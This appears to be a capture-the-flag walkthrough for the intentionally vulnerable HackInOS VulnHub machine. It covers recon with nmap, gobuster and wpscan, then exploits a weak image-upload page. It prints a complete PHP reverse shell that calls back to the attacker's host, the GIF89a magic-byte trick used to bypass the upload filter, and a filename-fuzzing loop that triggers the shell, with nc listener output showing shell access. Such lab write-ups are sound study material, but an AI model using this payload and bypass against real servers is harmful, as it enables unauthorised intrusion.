URL : [HackInOS](https://www.vulnhub.com/entry/hackinos-1,295/)

NOTE: make sure that the VM share the same network with attack VM
Recommend : Host-Only Adapter

# Recon

First and foremost, I need to find the IP of the attack machine via performing a `netdiscover` since it shares the same network with my attack machine 
```
$ sudo netdiscover -r 192.168.56.0/24
<SNIP>                                                                                                                                                                 
 192.168.56.103  08:00:27:20:a9:bc      3     180  PCS Systemtechnik GmbH
<SNIP>
```
-> the target IP is 192.168.56.103

Now let perform `nmap` TCP scan for open ports available on the target
```
$ sudo nmap -sV -vv -sC -O -A 192.168.56.103
<SNIP>
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG784LvNaNbACbq+WDUkIlEEMYCDyMkV+nCvnQG/acqhU2pj/DdyduoK3AE3RyPCjnp2Tj5TIYZOjRNXqdiAgix45+f/8uQSAXzMkehTgpRgAkRfcz9tY80G6Jc/0fglUjPuh+pa8W/2Zom9FoNkQlFlQNTAG5KXj7aNrdBTyznsxHBvxpdXOS+e1k4l4l8ecIhdV9fInbWgzx6HfzRl7P8ghYWW+7MN9rmyFkno8TwL0dH14BCtz+qM9trQ3OclpEAFHzZRcKKCT5lgyZRoWOi5hwP4ciR5omPlSIFri9spD7/VYlnHtOTq5VErkDXD7GLb85r12WPLFswPObxABl
|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCflFRiixnKHKZ6H/VbctPSyorJLf9d1+TGw4mZdB6tfB4KnuiXuZyc5PWXkYDtkgn5BhZCjgjW5EIFizhPMBsE=
|   256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN7nLDN7p/roJG7o7AEKF3C5IgV3HhMGJmBt9gC+wxci
8000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/upload.php /uploads
|_http-generator: WordPress 5.0.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blog &#8211; Just another WordPress site
|_http-open-proxy: Proxy might be redirecting requests
<SNIP>
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
<SNIP>
```

So the target uses Linux Operating system, and has 2 open ports which are 22 `SSH` and 8000 `HTTP`

## Directory Enumeration
Using `gobuster` to find hidden directories of the service 
```
$ gobuster dir -u http://192.168.56.103:8000// -w /usr/share/wordlists/dirb/big.txt
<SNIP>
robots.txt           (Status: 200) [Size: 52]
server-status        (Status: 403) [Size: 304]
uploads              (Status: 301) [Size: 325] [--> http://192.168.56.103:8000/uploads/]
wp-admin             (Status: 301) [Size: 326] [--> http://192.168.56.103:8000/wp-admin/]
wp-content           (Status: 301) [Size: 328] [--> http://192.168.56.103:8000/wp-content/]
wp-includes          (Status: 301) [Size: 329] [--> http://192.168.56.103:8000/wp-includes/]
```

I can assume that the target using Wordpress CMS, due to `wp-` patterns, I use `wpscan` for further information 
```
$ wpscan --url http://192.168.56.103:8000
<SNIP>
[+] WordPress version 5.0.3 identified (Insecure, released on 2019-01-09).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.56.103:8000/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.56.103:8000/, Match: 'WordPress 5.0.3'
<SNIP>

```

## HTTP - Port 8000
### `/robots.txt`
<img width="709" height="193" alt="Screenshot 2026-05-29 213014" src="https://github.com/user-attachments/assets/7f2b6ebe-1680-4950-8fe9-5bcd10ed58f5" />

The `/upload.php` is a page for uploading images to the server
<img width="1866" height="209" alt="Screenshot 2026-05-29 215758" src="https://github.com/user-attachments/assets/1e20973d-2b07-4543-a2de-f9cfa325c69e" />

When I upload something successfully it returns this `:)`
<img width="1908" height="181" alt="Screenshot 2026-05-29 220918" src="https://github.com/user-attachments/assets/4f434860-78a1-49ba-8ed6-202f7498e21b" />

Looking at the format of the image and the source code of the `upload.php` function 
```
<!DOCTYPE html>
<html>

<body>

<div align="center">
<form action="" method="post" enctype="multipart/form-data">
    <br>
    <b>Select image : </b> 
    <input type="file" name="file" id="file" style="border: solid;">
    <input type="submit" value="Submit" name="submit">
</form>
</div>
<?php

// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
	$rand_number = rand(1,100);
	$target_dir = "uploads/";
	$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
	$file_name = $target_dir . basename($_FILES["file"]["name"]);
	$uploadOk = 1;
	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));
	$type = $_FILES["file"]["type"];
	$check = getimagesize($_FILES["file"]["tmp_name"]);

	if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){
		$uploadOk = 1;
	}else{
		$uploadOk = 0;
		echo ":)";
	} 
  if($uploadOk == 1){
      move_uploaded_file($_FILES["file"]["tmp_name"], $target_file.".".$imageFileType);
      echo "File uploaded /uploads/?";
  }
}
?>

</body>
</html>
```
Reference : [Hint](https://github.com/fatihhcelik/Vulnerable-Machine---Hint)

This function only allow two types of content `image/png` and `image/gif`
When I upload a file with `gif` content type, the page returns with this 
<img width="1913" height="246" alt="Screenshot 2026-05-29 225348" src="https://github.com/user-attachments/assets/adbb4adb-bf72-4314-bdd9-5a4fba5e1514" />

Crafting the payload from [Reverse Shell Generator](https://www.revshells.com/)

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.101'; // Modify the IP address
$port = 9001; // Modify the port
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
-> `payload.php`

By appending `GIF89a` into the first line of the payload, which helps me turn the file into GIF and successfully modify the magic number of the file 

Checking the file type of my payload
```
$ file payload.php          
payload.php.gif: PHP script, ASCII text
```

So the approach is to modify the magic number to make the file become a gif file, appending some ascii text to convert the file type to gif




```
$ xxd payload.php | head
00000000: 4749 4638 3961 0a3c 3f70 6870 0a2f 2f20  GIF89a.<?php.// 
00000010: 7068 702d 7265 7665 7273 652d 7368 656c  php-reverse-shel
00000020: 6c20 2d20 4120 5265 7665 7273 6520 5368  l - A Reverse Sh
00000030: 656c 6c20 696d 706c 656d 656e 7461 7469  ell implementati
00000040: 6f6e 2069 6e20 5048 502e 2043 6f6d 6d65  on in PHP. Comme
00000050: 6e74 7320 7374 7269 7070 6564 2074 6f20  nts stripped to 
00000060: 736c 696d 2069 7420 646f 776e 2e20 5245  slim it down. RE
00000070: 3a20 6874 7470 733a 2f2f 7261 772e 6769  : https://raw.gi
00000080: 7468 7562 7573 6572 636f 6e74 656e 742e  thubusercontent.
00000090: 636f 6d2f 7065 6e74 6573 746d 6f6e 6b65  com/pentestmonke

$ file payload.php    
payload.php: GIF image data, version 89a, 15370 x 28735
```

I successfully upload the payload into the server. Now, it's time to access and trigger the payload `/uploads/payload.php`, but look at the `upload.php` function
```
$rand_number = rand(1,100);
$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
```

The file name will be uploaded with this format, so I have to create a lists with random number from 1,100 then fuzz with with `ffuf`
Creating the list
```
$ for num in $(seq 1 100); do echo -n "payload.php$num" | md5sum | sed 's/  -/.php/g' >> hash.txt; done
$ head hash.txt
057fbfe6b1649e4af94db5b579b35036.php
c095f674cacdf661e5757c9956b726f0.php
ed1fd452da584d81da1fbe47bdff7860.php
dece8246e3897532826e44994c1f019b.php
6db2aa9d1e1a1b0965ffa4fe5a7003e9.php
4e328c8b568263b2486133a83139e665.php
abdfeeebd30e39229844e7be44330b84.php
397a27a1a54e2a6642e2f9e23d0d4afe.php
eab906c2875302246f68ccb603ff2048.php
8940af50ffa55e0036a58795d53e2cd9.php
```

Fuzzing time
```
$ ffuf -w hash.txt -u http://192.168.56.103:8000/uploads/FUZZ
<SNIP>
4c09f01f419b7207ef5ed4e8b325b378.php [Status: 200, Size: 291, Words: 30, Lines: 6, Duration: 2ms]
:: Progress: [100/100] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
<SNIp>
```

However, to utilize the fuzzing phase, I set up a listener ready before executing `ffuf`
```
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 55606
Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux           
 13:56:41 up  2:55,  0 users,  load average: 13.00, 13.00, 13.00                                                    
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                 
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               
sh: 0: can't access tty; job control turned off                                                                     
$ whoami                                                                                                            
www-data 

```

Therefore, when if fuzz the target to find the uploaded file, it would trigger the payload
